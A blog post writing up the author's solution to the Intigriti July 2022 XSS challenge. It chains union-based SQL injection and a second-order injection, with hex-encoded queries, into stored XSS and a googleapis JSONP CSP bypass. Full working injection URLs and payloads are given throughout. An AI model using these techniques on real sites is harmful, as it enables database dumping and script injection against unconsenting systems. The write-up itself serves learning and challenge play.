---
layout: post
title:  "Intigriti july xss challenge"
date:   2022-07-28 09:29:20 +0700
categories: ctfwriteup
---

### Intigriti July xss challenge[Second order SQLI to XSS]

<p>• Hey all it been an really long time since i last posted something !</p>

<p>• Thankfully intigriti came up with an xss challenge for the month july and i solved it :D</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/xsschallenge.png">

<p>• Lets get into the challenge page and the challenge page seemed very blank ( no javascripts , no insertion points) at first thought!</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/challengepage.png">

<p>• The only dynamic activity happened in the page was fetching blog archives via month parameter.</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/dynamic.png">

<p>• Inserting any values or special characters throwed an error page and inserting any incremental numbers 4,5 throwed an blank page.</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/error.png">

<p>• hmmmm! maybe an sqlinjection? tried some logical payloads,Guess what? yesss sql injectionnnnn.</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/fails.png">

<br>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/loads.png">

<p>• But what we do with sql injection in an xss challenge? ok lets check wether we can dump the database.</p>

<p>• Going towards the classic sql exploitation!</p>

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 order by 1,2,3,4,5 -- -

Confirmed there is 5 columns using order by clause

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select 1,2,3,4,5 -- -

Noticed the reflection on 2,3,5 by union select clause
```

<p>• Can execute mysql functions,Checked with database(),user(),version() at first! and we are sitting on the 'blog' database.</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/reflect.png">

<p>• Dumping the table names of the database blog;</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/tablename.png">

```
Query used : https://challenge-0722.intigriti.io/challenge/challenge.php?month=1%20union%20select%20null,group_concat(table_name),null,null,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--%20-#
```

<p>• We came to an understanding there are three tables "post,user,youtube"! Now onto dumping the columns and contents.</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/whole.png">

<p>• The above is the structure database > tables > column </p>


```
Queries Used:
https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x75736572-- -

https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x706f7374-- -

https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x796f7574756265-- -
```
<p>• Note : I hex encoded the values of table name since the query escapes any special characters and throws error.</p>

<p>• After spending some time on examining data from each column, nothing been found except i was rickrolled on youtubeid :| </p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/rickroll.png">

<p>• It went on limelight that this challenge has nothing to do with data dump.</p>

<p>• Then tried to inject my content on the reflected 2,3 and 5th columns.</p>

```
Query used : 
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select 1,0x3c696d67207372633d313e,0x3c696d67207372633d313e,4,0x3c696d67207372633d313e -- -
```
 
<p>• It went really bad that all the special characters were filtered,thought might be the work of htmlspecialchars function on php :|</p>

<p>• It was the time i was stuck and tried things like load_file function :trollface: </p>

<p>• Then i tried to bypass the encoding with unicodes,double encoding and searched if there is any possible bypasses for htmlsepcialchars!</p>

<p>• Nothing helped sadly :(</p>

<p>• Then i came across this lovely rendition,the author name which was never rendered in any of the reflection(output by our sqlinjection query) magically came up when i tried some fuzzing with integers( ah i completely forgot to notice this ;} the author name) </p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/kanom.png">

<br>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/iruku.png">

<p>• Then i founded that the 4th column is responsible for this behaviour.</p>

```
Query : https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,1,null -- -

Output : Anton

Query : https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,2,null -- -

Ouput : Jake
```

<p>• Something was really fishy as the output was generated by the IDs 1,2 respecitively belongs to the Anton and jake</p>

<p>• Maybe the sql execution is passed down to a separate sql query?</p>

<p>• i tried with logical statement and yessssss it is :0</p>

```
Query Used :  

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,1 AND 1=1,null -- -

Output reflected 

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,1 AND 1=0,null -- -

Output not reflected

```

<p>• The i went the classical approach to find the columns and reflective field.</p>

<p>• I was able to find there were three columns (assumed it is user table).</p>

```
Query used:
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x31206f7264657220627920312c322c33,null -- -

1 order by 1,2,3  :  0x31206f7264657220627920312c322c33

Output renders

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x31206f7264657220627920312c322c332c34,null -- -

1 order by 1,2,3,4  :  0x31206f7264657220627920312c322c332c34

No output
```

<p>• Note : hex encoded since comma(,) will affect the query.</p>

<p>• Then i tried to see which column is injectable with union query but here comes the plot twist "No ouput" ; only jake and anton were reflected respectively.</p>

```
Query used : 
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x3220756e696f6e2073656c65637420312c322c64617461626173652829202d2d202d,null -- -

2 union select 1,2,database() -- -  :  0x3220756e696f6e2073656c65637420312c322c64617461626173652829202d2d202d
```

<p>• I was at dead end ,nothing seemed to work for a long time.</p>
<p>• I tried googling random things about sql injection and blogs( Some good learnings tho).</p>
<p>• Then i found this blog <a href="https://vk9-sec.com/advanced-sql-injection-union-based/">https://vk9-sec.com/advanced-sql-injection-union-based/</a></p>

```
From the blog: 
But in case you cannot see any of these column printed then you can simply invalidate the first query so that it won’t give any output and eventually your output will become the one and only output to be printed.
```

<p>• It made sense , The only ouput i was able to get was author name,maybe invalidating that query will actually make the union select query works?lets try!!!</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/2ref.png">

<p>• yasssssssss ! we got reflection on the 2 column on user table!</p>

```
Query used:
(https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x3120616e64203020756e696f6e2073656c65637420312c322c33202d2d202d,null from post-- -#)

1 and 0 union select 1,2,3 -- -  :  0x3120616e64203020756e696f6e2073656c65637420312c322c33202d2d202d

```

<p>• Then tried to check whether it has any special character escape and it did'nt had :0 </p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/xss.png">

<p>• We almost done the challenge, now the only part that is required is bypassing the csp !</p>

```
Query Used:

1 and 0 union select 1,0x3c696d67207372633d31206f6e6572726f723d616c6572742831293e,3 -- -  :  0x3120616e64203020756e696f6e2073656c65637420312c307833633639366436373230373337323633336433313230366636653635373237323666373233643631366336353732373432383331323933652c33202d2d202d
<img src=1 onerror=alert(1)>  :  0x3c696d67207372633d31206f6e6572726f723d616c6572742831293e
```

<p>• CSP :</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/csp.png">

<p>• My first go to is <a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a> ; since i already read about googleapis CSP bypass.</p>

<p>• But unfortunately the callback sites on the googleapis was down.</p>

<p>• Then i found the working endpoint on <a href="https://brutelogic.com.br/blog/csp-bypass-guidelines/">https://brutelogic.com.br/blog/csp-bypass-guidelines/</a></p>

```
<Script Src=https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)></Script>
```

<p>• Now time to frame the query !</p>

```
<script src='https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)'></script>  :  0x3c736372697074207372633d2768747470733a2f2f7777772e676f6f676c65617069732e636f6d2f637573746f6d7365617263682f76313f63616c6c6261636b3d616c65727428646f63756d656e742e646f6d61696e29273e3c2f7363726970743e

1 and 0 union select 1,0x3c736372697074207372633d2768747470733a2f2f7777772e676f6f676c65617069732e636f6d2f637573746f6d7365617263682f76313f63616c6c6261636b3d616c65727428646f63756d656e742e646f6d61696e29273e3c2f7363726970743e,3 -- -  :  0x3120616e64203020756e696f6e2073656c65637420312c3078336337333633373236393730373432303733373236333364323736383734373437303733336132663266373737373737326536373666366636373663363536313730363937333265363336663664326636333735373337343666366437333635363137323633363832663736333133663633363136633663363236313633366233643631366336353732373432383634366636333735366436353665373432653634366636643631363936653239323733653363326637333633373236393730373433652c33202d2d202d

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3%20union%20select%20null,null,null,0x3120616e64203020756e696f6e2073656c65637420312c3078336337333633373236393730373432303733373236333364323736383734373437303733336132663266373737373737326536373666366636373663363536313730363937333265363336663664326636333735373337343666366437333635363137323633363832663736333133663633363136633663363236313633366233643631366336353732373432383634366636333735366436353665373432653634366636643631363936653239323733653363326637333633373236393730373433652c33202d2d202d,null%20from%20post--%20-#
```

<p>• Now pasting the url on the browser window !</p>

<img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/popup.png">

<p>• Thats really a cute popup ! shoutout to intigriti and vroemy for the awesome challenge!</p>
